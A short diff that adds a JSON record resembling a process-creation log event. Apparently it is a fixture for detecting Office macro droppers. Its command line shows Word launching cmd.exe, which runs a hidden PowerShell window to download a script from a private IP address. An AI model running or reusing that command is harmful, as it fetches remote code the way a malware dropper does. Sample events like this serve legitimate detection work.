@@ -1,0 +1,6 @@
+{
+  "Image": "C:\\Windows\\System32\\cmd.exe",
+  "OriginalFileName": "Cmd.Exe",
+  "CommandLine": "cmd.exe /c powershell -w hidden -c \"iwr http://192.168.88.1/p.ps1\"",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+}
